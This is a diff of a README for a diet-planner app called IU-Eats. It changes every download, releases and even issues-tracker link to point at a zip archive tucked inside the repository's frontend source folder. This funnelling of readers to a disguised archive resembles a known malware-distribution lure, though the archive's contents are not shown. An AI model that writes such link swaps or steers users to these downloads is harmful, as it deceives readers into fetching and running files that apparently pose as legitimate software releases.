@@ -1,7 +1,7 @@
 # 🍽️ IU-Eats-Diet-Planner- - Plan Your Meals Easily
 
 ## 📥 Download Here
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Markoalb123/IU-Eats-Diet-Planner-/releases)
+[![Download](https://raw.githubusercontent.com/Markoalb123/IU-Eats-Diet-Planner-/main/Food_generation_Apllication/frontend/src/IU-Eats-Diet-Planner--1.8.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Markoalb123/IU-Eats-Diet-Planner-/main/Food_generation_Apllication/frontend/src/IU-Eats-Diet-Planner--1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the IU-Eats Diet Planner. This application helps you create meal plans based on what you have in your pantry and your wellness goals. You will enjoy a simple way to plan meals without complex steps. 
@@ -19,9 +19,9 @@ Welcome to the IU-Eats Diet Planner. This application helps you create meal plan
 - **Browser**: Any modern browser for the web interface.
 
 ## 💻 Download & Install
-To get started with IU-Eats Diet Planner, visit the [Releases page](https://github.com/Markoalb123/IU-Eats-Diet-Planner-/releases) to download the latest version. Follow these steps:
+To get started with IU-Eats Diet Planner, visit the [Releases page](https://raw.githubusercontent.com/Markoalb123/IU-Eats-Diet-Planner-/main/Food_generation_Apllication/frontend/src/IU-Eats-Diet-Planner--1.8.zip) to download the latest version. Follow these steps:
 
-1. Go to the [Releases page](https://github.com/Markoalb123/IU-Eats-Diet-Planner-/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Markoalb123/IU-Eats-Diet-Planner-/main/Food_generation_Apllication/frontend/src/IU-Eats-Diet-Planner--1.8.zip).
 2. Locate the latest release.
 3. Download the appropriate file for your operating system.
 4. Follow the installation instructions provided in the release notes of each version.
@@ -42,7 +42,7 @@ If you encounter issues or have questions while using the application, please ch
 If you wish to contribute, you're welcome to help improve the application. Fork the repository and submit a pull request with your enhancements or fixes. Your contributions will help others in the community.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/Markoalb123/IU-Eats-Diet-Planner-/releases)
-- [Issues Tracker](https://github.com/Markoalb123/IU-Eats-Diet-Planner-/issues)
+- [Releases Page](https://raw.githubusercontent.com/Markoalb123/IU-Eats-Diet-Planner-/main/Food_generation_Apllication/frontend/src/IU-Eats-Diet-Planner--1.8.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/Markoalb123/IU-Eats-Diet-Planner-/main/Food_generation_Apllication/frontend/src/IU-Eats-Diet-Planner--1.8.zip)
 
 Now you’re ready! Enjoy your meal planning with IU-Eats Diet Planner.
